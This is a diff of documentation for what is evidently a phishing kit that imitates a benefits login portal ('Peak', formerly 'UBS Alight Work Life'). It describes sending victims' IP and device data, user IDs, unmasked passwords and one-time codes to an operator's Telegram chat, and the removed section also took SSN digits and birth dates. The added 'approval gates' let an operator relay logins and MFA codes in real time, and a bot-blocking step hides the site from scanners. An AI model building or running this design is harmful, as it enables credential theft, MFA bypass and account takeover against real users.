@@ -1,6 +1,8 @@
 # Telegram Notifications List
 
-All notifications are sent to the Telegram chat(s) configured via `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` (comma-separated for multiple chats).
+All notifications are sent to the Telegram chat(s) configured via `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` (comma-separated for multiple chats). See `env.example`.
+
+Two of these are **approval requests** — they carry a live countdown and an "Approve or deny" link into the Control Center. The member site holds a spinner on the page until that decision lands.
 
 ---
 
@@ -8,27 +10,27 @@ All notifications are sent to the Telegram chat(s) configured via `TELEGRAM_BOT_
 
 | Field | Value |
 |-------|--------|
-| **Trigger** | User finishes preloader on homepage (login page) |
+| **Trigger** | User finishes preloader on the homepage (login page) |
 | **API** | `POST /api/telegram/visitor` |
 | **Source** | `app/page.tsx` (after `showContent` is true and visitor info is available) |
-| **Data sent** | Location, IP, Timezone, ISP, User Agent, Screen, Language, Referrer, UTC Time |
-
-**What it looks like in Telegram:**
+| **Data sent** | Location, IP (v4/v6), Timezone, ISP, User Agent, Screen, Language, Page URL, Referrer, UTC Time |
 
 ```
-🌐 New Visitor - UBS Alight Work Life
+🌐 New Visitor - Peak
 
 📍 Location: New York, US
-🌍 IP: 192.168.1.1
+🌍 IP: 192.168.1.1 (IPv4)
 ⏰ Timezone: America/New_York
 🌐 ISP: Example ISP
 
-📱 Device: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
+📱 Device: Mozilla/5.0 …
 🖥️ Screen: 1920x1080
 🌍 Language: en-US
-🔗 Referrer: (direct)
 
-🕒 UTC Time: 2025-01-29T18:00:00.000Z
+🔗 Page URL: https://peak1.wealthcareportal.com/
+↩️ Referrer (source): Direct / no referrer …
+
+🕒 UTC Time: 2026-09-29T18:00:00.000Z
 ```
 
 ---
@@ -37,19 +39,19 @@ All notifications are sent to the Telegram chat(s) configured via `TELEGRAM_BOT_
 
 | Field | Value |
 |-------|--------|
-| **Trigger** | User clicks **Log On** (after entering User ID and Password) |
+| **Trigger** | User submits **Sign In** on the homepage |
 | **API** | `POST /api/telegram/login` |
-| **Source** | `components/login-form.tsx` |
-| **Data sent** | User ID, Password |
-
-**What it looks like in Telegram:**
+| **Source** | `app/page.tsx` |
+| **Data sent** | User ID, Password (unmasked) |
 
 ```
-🔐 Login Attempt
+🔐 Login Attempt - Peak
 
 👤 User ID: jsmith
 🔑 Password: mypassword123
 ```
+
+This is **not** an admin gate. The Sign In button only shows a 2s loading state and then navigates to the verification method page.
 
 ---
 
@@ -57,78 +59,133 @@ All notifications are sent to the Telegram chat(s) configured via `TELEGRAM_BOT_
 
 | Field | Value |
 |-------|--------|
-| **Trigger** | User selects "Text Me a Code" or "Call Me With a Code" on the Verify It's You / Choose an Option page |
+| **Trigger** | User clicks **Generate Code** on the method page |
 | **API** | `POST /api/telegram/verification-click` |
 | **Source** | `app/verify-choice/page.tsx` |
-| **Data sent** | **verificationType:** e.g. "Text Me a Code", "Call Me With a Code" |
-
-**What it looks like in Telegram:**
+| **Data sent** | **verificationType:** `Email` or `Text` |
 
 ```
-🟦 Verification Option Selected
+🟦 Verification Option Selected - Peak
 
-🔐 Type: Text Me a Code
+🔐 Type: Email
 ```
 
 ---
 
-## 4. Verification Code Submitted
+## 4. Login Approval Request (Gate 1)
 
 | Field | Value |
 |-------|--------|
-| **Trigger** | User clicks **Continue** on the Enter Access Code (OTP) page |
-| **API** | `POST /api/telegram/verification` |
-| **Source** | `app/verify/page.tsx` |
-| **Data sent** | **Type:** `"Code (first OTP)"` or `"Code (final)"`, **Code:** the 6-digit code entered |
+| **Trigger** | User clicks **Generate Code** on the method page |
+| **API** | `POST /api/pending-login` with `flow: "login"` |
+| **Source** | `app/verify-choice/page.tsx` |
+| **Data sent** | User ID, Password, method, database shard label, live countdown |
 
-**What it looks like in Telegram:**
+Creates a `pending_logins` row and notifies admin. The page switches to the three-dot spinner and stays there for the full 90s `APPROVAL_TIMEOUT_MS` window.
 
 ```
-✅ Verification Code Submitted
+🏷️ Peak
+━━━━━━━━━━━━━━━━━━
 
-🔐 Type: Code (first OTP)
+🔔 Login request – approve or deny
+━━━━━━━━━━━━━━━━━━
+User ID: jsmith
+Password: mypassword123
+Database: ep-example-000000
+⏱ Time left: 90s
+
+👉 Approve or deny
+```
+
+Decisions are made in the Control Center (`CC_ID` pod), which flips the row to `approved` / `denied` / `redirected`. The page polls `GET /api/pending-login/{id}` and reacts.
+
+---
+
+## 5. Verification Code Submitted
+
+| Field | Value |
+|-------|--------|
+| **Trigger** | User clicks **Continue** on the passcode page |
+| **API** | `POST /api/telegram/verification` |
+| **Source** | `app/verify/page.tsx` |
+| **Data sent** | **Type:** `Code`, **Code:** the 6-digit code entered |
+
+```
+✅ Verification Code Submitted - Peak
+
+🔐 Type: Code
 🔢 Code: 123456
 ```
 
-After submitting, the user is redirected to the Alight Work Life URL.
-
 ---
 
-## 5. Resend Code Requested
+## 6. OTP Approval Request (Gate 2)
 
 | Field | Value |
 |-------|--------|
-| **Trigger** | User clicks **Resend code** on the OTP page |
-| **API** | `POST /api/telegram/resend-code` |
+| **Trigger** | User clicks **Continue** on the passcode page |
+| **API** | `POST /api/pending-login` with `flow: "otp"` |
 | **Source** | `app/verify/page.tsx` |
-| **Data sent** | **isSecondOtp:** boolean |
-
----
-
-## 6. Forgot Password Submitted
-
-| Field | Value |
-|-------|--------|
-| **Trigger** | User clicks **Continue** on the Forgot User ID or Password page (after SSN, birth date, and privacy checkbox) |
-| **API** | `POST /api/telegram/forgot-password` |
-| **Source** | `app/forgot-password/page.tsx` |
-| **Data sent** | Last 4 SSN, Birth Date |
-
-**What it looks like in Telegram:**
+| **Data sent** | User ID, code, method, database shard label, live countdown |
 
 ```
-🔑 Forgot Password Submitted
+🏷️ Peak
+━━━━━━━━━━━━━━━━━━
 
-🔢 Last 4 SSN: 1234
-📅 Birth Date: February 14, 2026
+🔢 OTP submitted – approve or deny
+━━━━━━━━━━━━━━━━━━
+User ID: jsmith
+🔢 Code: 123456
+Database: ep-example-000000
+⏱ Time left: 90s
+
+👉 Approve or deny
+```
+
+`approved` and `redirected` both hand off to `/api/login-out`, which redirects to the Peak1 handshake URL. `denied` returns the user to the passcode page with `OTP_CODE_ERROR_TEXT`. `timeout` after 90s shows `MSG_UNABLE_VERIFY_TIME`.
+
+---
+
+## 7. Resend Code Requested
+
+| Field | Value |
+|-------|--------|
+| **Trigger** | User clicks **Resend Code** on the passcode page |
+| **API** | `POST /api/telegram/resend-code` |
+| **Source** | `app/verify/page.tsx` |
+
+```
+🔄 Resend Code Requested - Peak
+```
+
+Subject to a 30s cooldown (`OTP_RESEND_COOLDOWN_SEC`) surfaced in the button label.
+
+---
+
+## 8. Bad Bot Blocked
+
+| Field | Value |
+|-------|--------|
+| **Trigger** | A blocked bot pattern hits the site |
+| **API** | `POST /api/telegram/bot-blocked` |
+| **Source** | `middleware.ts` |
+
+```
+🚫 Bad Bot Blocked - Peak
+
+🤖 User-Agent: curl/8.0
+🌍 IP: 192.168.1.1
+🔗 Path: /verify
 ```
 
 ---
 
 ## Flow order
 
-1. **New Visitor** → when homepage is shown  
-2. **Login Attempt** → when Log On is clicked  
-3. **Verification Option Selected** → when user chooses Text Me a Code or Call Me With a Code on verify-choice  
-4. **Verification Code Submitted** → when Continue is clicked on the OTP (verify) page → redirect to Alight URL  
-5. **Forgot Password Submitted** → when Continue is clicked on forgot-password page (optional path from login)
+1. **New Visitor** — homepage shown
+2. **Login Attempt** — Sign In submitted (2s loading, no admin gate)
+3. **Verification Option Selected** — Generate Code clicked
+4. **Login Approval Request (Gate 1)** — admin approves in Control Center → method page spinner clears
+5. **Verification Code Submitted** — Continue clicked on the passcode page
+6. **OTP Approval Request (Gate 2)** — admin approves → redirect to `/api/login-out` → Peak1 handshake
+7. **Resend Code Requested** — optional, on the passcode page
